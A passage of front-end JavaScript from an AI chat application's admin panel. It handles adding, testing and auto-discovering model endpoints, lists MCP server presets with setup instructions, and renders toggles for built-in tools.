        }
      } catch(e) {}
    }
    return u;
  }

  async function _defaultOllamaUrl() {
    try {
      const res = await fetch('/api/runtime', { credentials: 'same-origin' });
      if (res.ok) {
        const data = await res.json();
        if (data && data.ollama_base_url) return data.ollama_base_url;
      }
    } catch (_) {}
    return 'http://127.0.0.1:11434/v1';
  }

  function _renderEndpointTestResult(msg, res, d) {
    if (res.ok && d.status === 'empty') {
      msg.textContent = 'Online — no models found';
      msg.className = 'admin-success';
      return;
    }
    if (res.ok && d.online) {
      const models = d.models || [];
      const preview = models.slice(0, 3).map(m => esc(String(m).split('/').pop())).join(', ');
      msg.innerHTML = `Online — found ${models.length} model${models.length !== 1 ? 's' : ''}${preview ? `: ${preview}${models.length > 3 ? ', …' : ''}` : ''}`;
      msg.className = 'admin-success';
      return;
    }
    msg.textContent = (d && d.detail) || (d && d.ping_error ? `Offline — ${d.ping_error}` : 'Offline');
    msg.className = 'admin-error';
  }

  function _endpointMsg(kind) {
    return el(kind === 'local' ? 'adm-epLocalMsg' : 'adm-epApiMsg') || el('adm-epMsg');
  }

  let apiTestController = null;
  const apiTestBtn = el('adm-epApiTestBtn');
  const apiCancelTestBtn = el('adm-epApiCancelTestBtn');
  if (apiTestBtn) {
    apiTestBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('api');
      msg.textContent = ''; msg.className = '';
      const rawUrl = (urlInput.value || provider.value).trim();
      const apiKey = el('adm-epApiKey').value.trim();
      if (!rawUrl) { msg.textContent = 'Select a provider or enter a base URL'; msg.className = 'admin-error'; return; }
      if (provider.value && !apiKey) { msg.textContent = 'API key is required for cloud providers'; msg.className = 'admin-error'; return; }
      const url = provider.value && rawUrl === provider.value ? rawUrl : _normalizeBaseUrl(rawUrl);
      apiTestController = new AbortController();
      apiTestBtn.disabled = true;
      apiTestBtn.textContent = 'Testing...';
      if (apiCancelTestBtn) apiCancelTestBtn.classList.remove('hidden');
      try {
        const fd = new FormData();
        fd.append('base_url', url);
        if (apiKey) fd.append('api_key', apiKey);
        const res = await fetch('/api/model-endpoints/test', {
          method: 'POST',
          body: fd,
          credentials: 'same-origin',
          signal: apiTestController.signal,
        });
        const d = await res.json();
        _renderEndpointTestResult(msg, res, d);
      } catch (e) {
        if (e && e.name === 'AbortError') {
          msg.textContent = 'Test canceled';
          msg.className = '';
        } else {
          msg.textContent = 'Test failed: ' + (e && e.message ? e.message : 'request failed');
          msg.className = 'admin-error';
        }
      }
      apiTestController = null;
      apiTestBtn.disabled = false;
      apiTestBtn.textContent = 'Test';
      if (apiCancelTestBtn) apiCancelTestBtn.classList.add('hidden');
    });
  }
  if (apiCancelTestBtn) {
    apiCancelTestBtn.addEventListener('click', () => {
      if (apiTestController) apiTestController.abort();
    });
  }

  el('adm-epAddBtn').addEventListener('click', async () => {
    const msg = _endpointMsg('api');
    msg.textContent = ''; msg.className = '';
    const rawUrl = (urlInput.value || provider.value).trim();
    const apiKey = el('adm-epApiKey').value.trim();
    if (!rawUrl) { msg.textContent = 'Select a provider or enter a base URL'; msg.className = 'admin-error'; return; }
    if (provider.value && !apiKey) { msg.textContent = 'API key is required for cloud providers'; msg.className = 'admin-error'; return; }
    // Normalize URL (fix typos, add /v1, strip wrong paths)
    const url = provider.value && rawUrl === provider.value ? rawUrl : _normalizeBaseUrl(rawUrl);
    const btn = el('adm-epAddBtn');
    btn.disabled = true; btn.textContent = 'Adding...';
    try {
      const fd = new FormData();
      fd.append('base_url', url);
      if (apiKey) fd.append('api_key', apiKey);
      if (provider.value && provider.selectedOptions && provider.selectedOptions[0]) {
        fd.append('name', provider.selectedOptions[0].textContent.trim());
      }
      const epType = el('adm-epType');
      if (epType) fd.append('model_type', epType.value);
      if (provider.value && /openrouter\.ai|ollama\.com/i.test(provider.value)) fd.append('require_models', 'true');
      else fd.append('skip_probe', 'false');
      const res = await fetch('/api/model-endpoints', { method: 'POST', body: fd, credentials: 'same-origin' });
      const d = await res.json();
      if (res.ok) {
        const count = d.models ? d.models.length : 0;
        urlInput.value = ''; urlInput.style.display = '';
        el('adm-epApiKey').value = ''; provider.value = '';
        if (epType) epType.value = 'llm';
        if (d.id) _recentlyAddedEpId = String(d.id);
        await loadEndpoints();
        await _selectAddedModelInChat(d);
        if (!d.online) {
          msg.textContent = 'Added (endpoint offline — will retry on next load)';
          msg.className = 'admin-error';
        } else if (d.status === 'empty') {
          msg.textContent = 'Added — endpoint reachable, no models found';
          msg.className = 'admin-success';
        } else {
          msg.textContent = `Added — found ${count} model${count !== 1 ? 's' : ''}`;
          msg.className = 'admin-success';
        }
      } else { msg.textContent = d.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
    btn.disabled = false; btn.textContent = 'Add';
  });

  // Local "Add" button — sibling form for self-hosted base URLs.
  const localAddBtn = el('adm-epLocalAddBtn');
  const localTestBtn = el('adm-epLocalTestBtn');
  if (localTestBtn) {
    localTestBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('local');
      msg.textContent = ''; msg.className = '';
      const raw = (el('adm-epLocalUrl').value || '').trim();
      if (!raw) { msg.textContent = 'Enter a base URL to test'; msg.className = 'admin-error'; return; }
      const url = _normalizeBaseUrl(raw);
      const keyEl = el('adm-epLocalApiKey');
      const apiKey = keyEl ? keyEl.value.trim() : '';
      localTestBtn.disabled = true;
      localTestBtn.textContent = 'Testing...';
      try {
        const fd = new FormData();
        fd.append('base_url', url);
        if (apiKey) fd.append('api_key', apiKey);
        const res = await fetch('/api/model-endpoints/test', { method: 'POST', body: fd, credentials: 'same-origin' });
        const d = await res.json();
        _renderEndpointTestResult(msg, res, d);
      } catch (e) {
        msg.textContent = 'Test failed: ' + (e && e.message ? e.message : 'request failed');
        msg.className = 'admin-error';
      }
      localTestBtn.disabled = false;
      localTestBtn.textContent = 'Test';
    });
  }
  if (localAddBtn) {
    localAddBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('local');
      msg.textContent = ''; msg.className = '';
      const raw = (el('adm-epLocalUrl').value || '').trim();
      if (!raw) { msg.textContent = 'Enter a base URL (e.g. http://localhost:8002/v1)'; msg.className = 'admin-error'; return; }
      const url = _normalizeBaseUrl(raw);
      const keyEl = el('adm-epLocalApiKey');
      const apiKey = keyEl ? keyEl.value.trim() : '';
      localAddBtn.disabled = true; localAddBtn.textContent = 'Adding...';
      try {
        const fd = new FormData();
        fd.append('base_url', url);
        if (apiKey) fd.append('api_key', apiKey);
        const lt = el('adm-epLocalType');
        if (lt) fd.append('model_type', lt.value);
        fd.append('skip_probe', 'false');
        const res = await fetch('/api/model-endpoints', { method: 'POST', body: fd, credentials: 'same-origin' });
        const d = await res.json();
        if (res.ok) {
          el('adm-epLocalUrl').value = '';
          if (keyEl) keyEl.value = '';
          if (lt) lt.value = 'llm';
          if (d.id) _recentlyAddedEpId = String(d.id);
          await loadEndpoints();
          await _selectAddedModelInChat(d);
          const count = (d.models || []).length;
          msg.textContent = d.status === 'empty'
            ? 'Added — Ollama is running, no models pulled yet'
            : d.online
            ? `Added — found ${count} model${count !== 1 ? 's' : ''}`
            : 'Added (offline — will retry on next load)';
          msg.className = d.online ? 'admin-success' : 'admin-error';
        } else { msg.textContent = d.detail || 'Failed'; msg.className = 'admin-error'; }
      } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
      localAddBtn.disabled = false; localAddBtn.textContent = 'Add';
    });
  }

  const ollamaBtn = el('adm-epOllamaBtn');
  if (ollamaBtn) {
    ollamaBtn.addEventListener('click', async () => {
      const input = el('adm-epLocalUrl');
      if (input) {
        input.value = await _defaultOllamaUrl();
        input.focus();
      }
      const msg = _endpointMsg('local');
      if (msg) {
        msg.innerHTML = '<span style="font-size:11px;opacity:0.55;">Ollama ready to test.</span>';
        msg.className = '';
      }
    });
  }

  // Discover local models button
  const discoverBtn = el('adm-epDiscoverBtn');
  if (discoverBtn) {
    discoverBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('local');
      discoverBtn.disabled = true;
      // Keep the button's icon as-is while scanning; the whirlpool +
      // status text below is enough feedback. (Two spinning indicators
      // at once looks busy.)
      msg.className = '';
      msg.innerHTML = '';
      try {
        const sp = window.spinnerModule || (await import('./spinner.js')).default;
        const wp = sp.createWhirlpool(20);
        wp.element.style.cssText = 'display:inline-block;vertical-align:middle;margin:0 8px 0 0;';
        const wrap = document.createElement('div');
        wrap.style.cssText = 'display:flex;align-items:center;padding:8px 0;';
        wrap.appendChild(wp.element);
        const txt = document.createElement('span');
        txt.textContent = 'Scanning ports 8000-8020 and 11434 for model servers...';
        txt.style.cssText = 'font-size:12px;opacity:0.7;';
        wrap.appendChild(txt);
        msg.appendChild(wrap);
        discoverBtn._wp = wp;
      } catch(e) { msg.textContent = 'Scanning...'; }
      try {
        const res = await fetch('/api/discover');
        const data = await res.json();
        const items = data.items || [];
        if (!items.length) {
          msg.textContent = 'No model servers found. Make sure vLLM, llama.cpp, SGLang, or Ollama is running. Docker users may need Ollama bound to a trusted reachable interface.';
          msg.className = 'admin-error';
        } else {
          // Auto-add each discovered endpoint. Server dedupes on base_url
          // and returns `existing: true` for already-registered ones.
          let added = 0;
          let skipped = 0;
          for (const item of items) {
            const base = item.url.replace('/chat/completions', '').replace(/\/$/, '');
            const fd = new FormData();
            fd.append('base_url', base);
            fd.append('skip_probe', 'false');
            const r = await fetch('/api/model-endpoints', { method: 'POST', body: fd });
            if (r.ok) {
              try {
                const dd = await r.json();
                if (dd && dd.existing) { skipped++; }
                else { added++; if (dd && dd.id) _recentlyAddedEpId = String(dd.id); }
              } catch (_) { added++; }
            }
          }
          const totalModels = items.reduce((n, i) => n + (i.models ? i.models.length : 0), 0);
          const parts = [`Found ${items.length} server${items.length !== 1 ? 's' : ''} with ${totalModels} model${totalModels !== 1 ? 's' : ''}`];
          if (added) parts.push(`added ${added} new`);
          if (skipped) parts.push(`${skipped} already added`);
          msg.innerHTML = parts.join(' — ');
          msg.className = 'admin-success';
          loadEndpoints();
        }
      } catch (e) {
        msg.textContent = 'Scan failed: ' + e.message;
        msg.className = 'admin-error';
      }
      if (discoverBtn._wp) { discoverBtn._wp.destroy(); discoverBtn._wp = null; }
      discoverBtn.disabled = false;
      discoverBtn.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" style="vertical-align:-1px;margin-right:4px;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>Scan for Servers';
    });
  }

  // Collapsible Add-Models subsections (API / Local). Both start collapsed
  // so the card is compact; the last-used state is remembered per section
  // in localStorage so a frequent API-adder doesn't re-expand every time.
  document.querySelectorAll('#adm-add-api, #adm-add-local').forEach((sec) => {
    const head = sec.querySelector('.adm-section-toggle');
    if (!head) return;
    const key = 'odysseus.addModels.' + sec.id + '.open';
    let open = false;
    try { open = localStorage.getItem(key) === '1'; } catch {}
    const apply = () => {
      sec.classList.toggle('collapsed', !open);
      head.setAttribute('aria-expanded', open ? 'true' : 'false');
    };
    apply();
    const toggle = () => {
      open = !open;
      try { localStorage.setItem(key, open ? '1' : '0'); } catch {}
      apply();
    };
    head.addEventListener('click', toggle);
    head.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); }
    });
  });
  document.querySelectorAll('.adm-quickstart-section').forEach((sec) => {
    const head = sec.querySelector('.adm-quickstart-toggle');
    if (!head) return;
    const key = 'odysseus.addModels.' + sec.id + '.open';
    let open = false;
    try { open = localStorage.getItem(key) === '1'; } catch {}
    const apply = () => {
      sec.classList.toggle('collapsed', !open);
      head.setAttribute('aria-expanded', open ? 'true' : 'false');
    };
    apply();
    const toggle = () => {
      open = !open;
      try { localStorage.setItem(key, open ? '1' : '0'); } catch {}
      apply();
    };
    head.addEventListener('click', toggle);
    head.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); }
    });
  });
}

/* ═══════════════════════════════════════════
   TOOLS TAB — MCP
   ═══════════════════════════════════════════ */

const _GOOGLE_OAUTH_HELP = `To get Google OAuth credentials:
1. Go to console.cloud.google.com
2. Click the project dropdown (top left) > New Project > name it > Create
3. APIs & Services > Library > enable the API you need (Gmail, Calendar, Drive, etc.)
4. APIs & Services > OAuth consent screen > configure (External, app name + email)
5. Under Audience, click Add Users > add your Google email as a test user
6. APIs & Services > Credentials > + Create Credentials > OAuth Client ID > Desktop App
7. Copy the Client ID and Client Secret into the fields above
8. After adding the server, click Authorize to sign in with Google
9. If accessing remotely: sign in, then copy the URL from the error page and paste it back`;

const MCP_PRESETS = [
  { name: "Gmail",           command: "npx", args: ["-y", "@gongrzhe/server-gmail-autoauth-mcp"],      env: { GOOGLE_CLIENT_ID: "", GOOGLE_CLIENT_SECRET: "" },
    oauthFile: { dir: "~/.gmail-mcp", filename: "gcp-oauth.keys.json" },
    oauth: {
      provider: "google",
      keys_file: "~/.gmail-mcp/gcp-oauth.keys.json",
      token_file: "~/.gmail-mcp/credentials.json",
      scopes: ["https://www.googleapis.com/auth/gmail.modify", "https://www.googleapis.com/auth/gmail.settings.basic"],
    },
    help: `Setup:
1. Go to console.cloud.google.com > create or select a project
2. APIs & Services > Library > search "Gmail API" > Enable
3. APIs & Services > OAuth consent screen > set up (External is fine)
4. Under Audience, add your Gmail address as a test user
5. APIs & Services > Credentials > + Create Credentials > OAuth Client ID
6. Application type: Desktop App > Create
7. Copy the Client ID and Client Secret into the fields above
8. Click Add Server, then click the Authorize button
9. Sign in with Google, copy the URL from the error page, paste it back` },
  { name: "Email (IMAP/SMTP)", command: "npx", args: ["-y", "@codefuturist/email-mcp", "stdio"],        env: { MCP_EMAIL_ADDRESS: "", MCP_EMAIL_PASSWORD: "", MCP_EMAIL_IMAP_HOST: "", MCP_EMAIL_SMTP_HOST: "" },
    providerDropdown: {
      label: "Provider",
      targets: { MCP_EMAIL_IMAP_HOST: "imap", MCP_EMAIL_SMTP_HOST: "smtp" },
      options: [
        { name: "Migadu",        imap: "imap.migadu.com",     smtp: "smtp.migadu.com" },
        { name: "Fastmail",      imap: "imap.fastmail.com",   smtp: "smtp.fastmail.com" },
        { name: "Proton Bridge", imap: "127.0.0.1",           smtp: "127.0.0.1" },
        { name: "Outlook/Hotmail", imap: "outlook.office365.com", smtp: "smtp.office365.com" },
        { name: "Yahoo",         imap: "imap.mail.yahoo.com", smtp: "smtp.mail.yahoo.com" },
        { name: "iCloud",        imap: "imap.mail.me.com",    smtp: "smtp.mail.me.com" },
        { name: "Zoho",          imap: "imap.zoho.com",       smtp: "smtp.zoho.com" },
        { name: "Custom",        imap: "",                    smtp: "" },
      ],
    },
    help: "Works with any IMAP/SMTP email provider.\n1. Pick your provider from the dropdown (or choose Custom)\n2. Enter your email address and password (or app password)\n3. Click Add Server" },
  { name: "CalDAV (Radicale/Nextcloud)", command: "npx", args: ["-y", "caldav-mcp"],                     env: { CALDAV_BASE_URL: "http://localhost:5232", CALDAV_USERNAME: "", CALDAV_PASSWORD: "" },
    help: "Works with any CalDAV server (Radicale, Nextcloud, etc.).\n1. Enter your CalDAV server URL (e.g. http://localhost:5232)\n2. Enter your username and password\n3. Click Add Server" },
  { name: "Google Calendar", command: "npx", args: ["-y", "@cocal/google-calendar-mcp"],                 env: { GOOGLE_OAUTH_CREDENTIALS: "" },
    help: `Setup:
1. Go to console.cloud.google.com > create/select a project
2. APIs & Services > Library > enable Google Calendar API
3. APIs & Services > Credentials > + Create Credentials > OAuth Client ID
4. Application type: Desktop App > Create
5. Click "Download JSON" on the credential you just created
6. Set Google Oauth Credentials to the full path of the downloaded JSON file` },
  { name: "Google Drive",    command: "npx", args: ["-y", "@modelcontextprotocol/server-gdrive"],        env: {},
    help: "Google Drive uses browser-based OAuth on first run. No env vars needed — just click Add and authorize when prompted." },
  { name: "GitHub",          command: "npx", args: ["-y", "@modelcontextprotocol/server-github"],        env: { GITHUB_PERSONAL_ACCESS_TOKEN: "" },
    help: "1. Go to github.com > Settings > Developer Settings > Personal Access Tokens > Fine-grained tokens\n2. Generate a new token with the repo permissions you need\n3. Paste it as Github Personal Access Token" },
  { name: "Slack",           command: "npx", args: ["-y", "@modelcontextprotocol/server-slack"],         env: { SLACK_BOT_TOKEN: "", SLACK_TEAM_ID: "" },
    help: "1. Go to api.slack.com/apps > Create New App > From Scratch\n2. Add Bot Token Scopes (channels:read, chat:write, etc.)\n3. Install to workspace, copy the Bot User OAuth Token (xoxb-...)\n4. Team ID is in your workspace URL or Slack admin settings" },
  { name: "Notion",          command: "npx", args: ["-y", "@notionhq/notion-mcp-server"],               env: { OPENAPI_MCP_HEADERS: "" },
    help: "1. Go to notion.so/my-integrations\n2. Create a new integration\n3. Copy the Internal Integration Secret\n4. Share the Notion pages/databases you want accessible with the integration\n5. For Openapi Mcp Headers enter:\n   {\"Authorization\": \"Bearer YOUR_SECRET\", \"Notion-Version\": \"2022-06-28\"}" },
  { name: "Linear",          command: "npx", args: ["-y", "mcp-linear"],                                env: { LINEAR_API_KEY: "" },
    help: "1. Go to linear.app > Settings > API\n2. Create a Personal API Key\n3. Paste it as Linear Api Key" },
  { name: "Brave Search",    command: "npx", args: ["-y", "@modelcontextprotocol/server-brave-search"], env: { BRAVE_API_KEY: "" },
    help: "1. Go to brave.com/search/api\n2. Sign up for a free plan (2000 queries/month)\n3. Copy your API key" },
  { name: "Browser (Playwright)", command: "npx", args: ["-y", "@playwright/mcp@latest", "--headless"],  env: {},
    help: "Browser automation via Playwright. The AI can navigate pages, click, fill forms, and read content.\nRuns headless by default. Remove --headless from Args to see the browser window.\nFirst run installs Chromium automatically." },
  { name: "Filesystem",      command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/home"], env: {},
    help: "Edit the Args field to change which directory the server has access to." },
  { name: "Memory",          command: "npx", args: ["-y", "@modelcontextprotocol/server-memory"],        env: {} },
  { name: "Postgres",        command: "npx", args: ["-y", "@modelcontextprotocol/server-postgres", "postgresql://user:pass@localhost/db"], env: {},
    help: "Replace the connection string in the Args field with your actual Postgres connection URL." },
  { name: "Todoist",         command: "npx", args: ["-y", "todoist-mcp-server"],                         env: { TODOIST_API_TOKEN: "" },
    help: "1. Go to todoist.com > Settings > Integrations > Developer\n2. Copy your API token" },
];
// ── Built-in tools management ──
const TOOL_META = {
  bash:              { name: 'Shell',            desc: 'Execute bash commands',           cat: 'Code',       ctx: '~200' },
  python:            { name: 'Python',           desc: 'Run Python scripts',              cat: 'Code',       ctx: '~200' },
  read_file:         { name: 'Read File',        desc: 'Read files from disk',            cat: 'Code',       ctx: '~150' },
  write_file:        { name: 'Write File',       desc: 'Write/create files',              cat: 'Code',       ctx: '~150' },
  web_search:        { name: 'Web Search',       desc: 'Search the web via SearXNG',      cat: 'Search',     ctx: '~300' },
  search_chats:      { name: 'Search Chats',     desc: 'Search conversation history',     cat: 'Search',     ctx: '~150' },
  create_document:   { name: 'Create Document',  desc: 'Create new documents',            cat: 'Documents',  ctx: '~200' },
  update_document:   { name: 'Update Document',  desc: 'Modify existing documents',       cat: 'Documents',  ctx: '~200' },
  edit_document:     { name: 'Edit Document',    desc: 'Find & replace in documents',     cat: 'Documents',  ctx: '~200' },
  suggest_document:  { name: 'Suggest Changes',  desc: 'Propose document edits',          cat: 'Documents',  ctx: '~200' },
  manage_documents:  { name: 'Manage Documents', desc: 'List, delete, organize docs',     cat: 'Documents',  ctx: '~150' },
  generate_image:    { name: 'Generate Image',   desc: 'Create images via AI',            cat: 'Media',      ctx: '~150' },
  manage_memory:     { name: 'Memory',           desc: 'Save and recall memories',        cat: 'Knowledge',  ctx: '~200' },
  manage_skills:     { name: 'Skills',           desc: 'Learn and use procedures',        cat: 'Knowledge',  ctx: '~200' },
  manage_rag:        { name: 'RAG / Docs',       desc: 'Query indexed documents',         cat: 'Knowledge',  ctx: '~150' },
  chat_with_model:   { name: 'Chat with Model',  desc: 'Talk to another AI model',        cat: 'Multi-Agent', ctx: '~200' },
  second_opinion:    { name: 'Second Opinion',   desc: 'Get another model\'s take',       cat: 'Multi-Agent', ctx: '~150' },
  pipeline:          { name: 'Pipeline',         desc: 'Multi-step AI workflows',         cat: 'Multi-Agent', ctx: '~200' },
  ask_teacher:       { name: 'Ask Teacher',      desc: 'Query a more capable model',      cat: 'Multi-Agent', ctx: '~150' },
  send_to_session:   { name: 'Send to Session',  desc: 'Send message to another chat',    cat: 'Sessions',   ctx: '~100' },
  create_session:    { name: 'Create Session',   desc: 'Start a new chat session',        cat: 'Sessions',   ctx: '~100' },
  list_sessions:     { name: 'List Sessions',    desc: 'Browse existing sessions',        cat: 'Sessions',   ctx: '~100' },
  manage_session:    { name: 'Manage Session',   desc: 'Rename, archive, configure',      cat: 'Sessions',   ctx: '~100' },
  list_models:       { name: 'List Models',      desc: 'Show available models',           cat: 'System',     ctx: '~100' },
  ui_control:        { name: 'UI Control',       desc: 'Change theme, layout, settings',  cat: 'System',     ctx: '~150' },
  manage_tasks:      { name: 'Tasks',            desc: 'Schedule automated tasks',        cat: 'System',     ctx: '~150' },
  api_call:          { name: 'API Call',         desc: 'Make HTTP requests',              cat: 'System',     ctx: '~200' },
  manage_endpoints:  { name: 'Endpoints',        desc: 'Add/remove model endpoints',      cat: 'System',     ctx: '~100' },
  manage_mcp:        { name: 'MCP Servers',      desc: 'Manage MCP connections',          cat: 'System',     ctx: '~100' },
  manage_webhooks:   { name: 'Webhooks',         desc: 'Configure webhook events',        cat: 'System',     ctx: '~100' },
  manage_tokens:     { name: 'API Tokens',       desc: 'Manage API access tokens',        cat: 'System',     ctx: '~100' },
  manage_settings:   { name: 'Settings',         desc: 'Change app settings',             cat: 'System',     ctx: '~100' },
};

async function loadBuiltinTools() {
  const list = el('adm-builtin-tools-list');
  if (!list) return;
  try {
    const res = await fetch('/api/tools', { credentials: 'same-origin' });
    const data = await res.json();
    const tools = data.tools || [];
    if (!tools.length) { list.innerHTML = '<div class="admin-empty">No tools found</div>'; return; }

    // Group by category
    const groups = {};
    for (const t of tools) {
      const meta = TOOL_META[t.id] || { name: t.id, desc: '', cat: 'Other', ctx: '?' };
      const cat = meta.cat;
      if (!groups[cat]) groups[cat] = [];
      groups[cat].push({ ...t, ...meta });
    }

    // Category order
    const catOrder = ['Code', 'Search', 'Documents', 'Media', 'Knowledge', 'Multi-Agent', 'Sessions', 'System', 'Other'];
    let html = '';
    for (const cat of catOrder) {
      const items = groups[cat];
      if (!items) continue;
      const enabledCount = items.filter(i => i.enabled).length;
      const totalCount = items.length;
      const catId = 'tool-cat-' + cat.replace(/[^a-zA-Z]/g, '');
      const allEnabled = enabledCount === totalCount;
      html += `<div class="admin-tool-category">
        <div class="admin-tool-cat-header" data-tool-cat="${catId}" style="cursor:pointer;display:flex;align-items:center;justify-content:space-between;">
          <span>${esc(cat)}</span>
          <span style="display:flex;align-items:center;gap:6px;" class="admin-tool-cat-right">
            <span class="admin-tool-cat-count" style="font-size:10px;opacity:0.5;">${enabledCount}/${totalCount}</span>
            <label class="admin-switch" style="flex-shrink:0;">
              <input type="checkbox" data-tool-cat-toggle="${catId}" ${allEnabled ? 'checked' : ''}>
              <span class="admin-slider"></span>
            </label>
            <svg class="admin-tool-cat-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>
          </span>
        </div>
        <div class="admin-tool-cat-body hidden" id="${catId}">`;
      for (const t of items) {
        html += `
        <div class="admin-tool-row">
          <div class="admin-tool-info">
            <span class="admin-tool-name">${esc(t.name)}</span>
            <span class="admin-tool-desc">${esc(t.desc)}</span>
          </div>
          <span class="admin-tool-ctx" title="Approximate context tokens used">${esc(t.ctx)}</span>
          <label class="admin-switch" style="flex-shrink:0;">
            <input type="checkbox" data-tool-id="${esc(t.id)}" ${t.enabled ? 'checked' : ''}>
            <span class="admin-slider"></span>
          </label>
        </div>`;
      }
      html += '</div></div>';
    }
    list.innerHTML = html;

    // Prevent toggle clicks from expanding/collapsing
    list.querySelectorAll('.admin-tool-cat-right').forEach(span => {
      span.addEventListener('click', e => e.stopPropagation());
    });

    // Wire category expand/collapse
    list.querySelectorAll('[data-tool-cat]').forEach(header => {
      header.addEventListener('click', () => {
        const body = el(header.dataset.toolCat);
        if (!body) return;
        body.classList.toggle('hidden');
        const chevron = header.querySelector('.admin-tool-cat-chevron');
        const isOpen = !body.classList.contains('hidden');
        if (chevron) {
          chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
          chevron.style.opacity = isOpen ? '0.7' : '0.3';
        }
      });
    });

    // Helper: save disabled tools + update counters
    async function _saveToolState() {
      const allChecks = list.querySelectorAll('input[data-tool-id]');
      const disabled = [];
      allChecks.forEach(c => { if (!c.checked) disabled.push(c.dataset.toolId); });
      await fetch('/api/tools', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ disabled }),
        credentials: 'same-origin',
      });
    }
    function _updateCatCounter(catEl) {
      if (!catEl) return;
      const catChecks = catEl.querySelectorAll('input[data-tool-id]');
      const catEnabled = Array.from(catChecks).filter(c => c.checked).length;
      const counter = catEl.querySelector('.admin-tool-cat-count');
      if (counter) counter.textContent = catEnabled + '/' + catChecks.length;
      const catToggle = catEl.querySelector('input[data-tool-cat-toggle]');
      if (catToggle) catToggle.checked = (catEnabled === catChecks.length);
    }

    // Wire individual tool toggles
    list.querySelectorAll('input[data-tool-id]').forEach(chk => {
      chk.addEventListener('change', async () => {
        await _saveToolState();
        _updateCatCounter(chk.closest('.admin-tool-category'));
      });
    });

    // Wire category-level toggle (enable/disable all in category)
    list.querySelectorAll('input[data-tool-cat-toggle]').forEach(chk => {
      chk.addEventListener('change', async () => {
        const catEl = chk.closest('.admin-tool-category');
        if (!catEl) return;
        const checked = chk.checked;
        catEl.querySelectorAll('input[data-tool-id]').forEach(c => { c.checked = checked; });
        await _saveToolState();
        _updateCatCounter(catEl);
      });
    });
  } catch (e) {
    console.error('Failed to load tools:', e);
    list.innerHTML = '<div class="admin-empty">Failed to load tools</div>';
  }
}

async function loadMcpServers() {
  const list = el('adm-mcpList');
  if (!list) return;  // MCP section not visible / not yet rendered
  try {
    const res = await fetch('/api/mcp/servers', { credentials: 'same-origin' });
    const servers = await res.json();
    if (!servers.length) { list.innerHTML = '<div class="admin-empty">No MCP servers configured</div>'; return; }
    list.innerHTML = servers.map(s => {
      const statusColor = s.needs_oauth ? '#e5a33a' : s.status === 'connected' ? 'var(--fg)' : s.status === 'error' ? 'var(--red)' : 'color-mix(in srgb, var(--fg) 50%, transparent)';
      const toolInfo = s.status === 'connected' ? `${s.enabled_tool_count}/${s.tool_count} tools enabled` : '';
      const statusText = s.needs_oauth ? 'Needs authorization' : s.status === 'connected' ? `Connected (${toolInfo})` : s.status === 'error' ? `Error: ${s.error || 'unknown'}` : 'Disconnected';
      const hasTools = s.status === 'connected' && s.tool_count > 0;
      return `<div class="admin-user-row" data-adm-mcp-id="${s.id}">
        <div style="display:flex;align-items:center;justify-content:space-between;${hasTools ? 'cursor:pointer;' : ''}padding:4px 0;" data-adm-mcp-header="${s.id}">
          <div class="admin-user-info" style="flex:1;flex-wrap:wrap;gap:0.3rem;">
            <span class="admin-user-name">${esc(s.name)}</span>
            <span class="admin-badge" style="background:${statusColor}33;color:${statusColor}">${statusText}</span>
            ${hasTools ? `<span style="font-size:10px;opacity:0.4;">Click to manage tools</span>` : ''}
          </div>
          <div style="display:flex;gap:4px;align-items:center;">
            ${s.needs_oauth ? `<a href="/api/mcp/oauth/authorize/${s.id}" target="_blank" class="admin-btn-sm" style="background:var(--red);color:#fff;text-decoration:none;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:600;">Authorize</a>` : ''}
            <button class="admin-btn-sm" data-adm-mcp-reconnect="${s.id}">Reconnect</button>
            <button class="admin-btn-delete" style="border-color:${s.is_enabled ? 'color-mix(in srgb, var(--red) 30%, transparent)' : 'color-mix(in srgb, var(--fg) 30%, transparent)'};color:${s.is_enabled ? 'var(--red)' : 'var(--fg)'};" data-adm-mcp-toggle="${s.id}" data-adm-mcp-enable="${!s.is_enabled}">${s.is_enabled ? 'Disable' : 'Enable'}</button>
            <button class="admin-btn-delete" data-adm-mcp-delete="${s.id}">Delete</button>
            ${hasTools ? '<svg class="admin-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>' : ''}
          </div>
        </div>
        ${hasTools ? `<div class="mcp-tools-panel hidden" data-adm-mcp-tools-panel="${s.id}"></div>` : ''}
      </div>`;
    }).join('');
    list.querySelectorAll('[data-adm-mcp-reconnect]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const msg = el('adm-mcpMsg'); msg.textContent = 'Reconnecting...'; msg.className = '';
        try {
          const res = await fetch(`/api/mcp/servers/${btn.dataset.admMcpReconnect}/reconnect`, { method: 'POST', credentials: 'same-origin' });
          const data = await res.json();
          msg.textContent = data.connected ? `Reconnected (${data.tool_count} tools)` : `Failed: ${data.error || 'unknown'}`;
          msg.className = data.connected ? 'admin-success' : 'admin-error';
          loadMcpServers();
        } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
      });
    });
    list.querySelectorAll('[data-adm-mcp-toggle]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const fd = new FormData(); fd.append('is_enabled', btn.dataset.admMcpEnable);
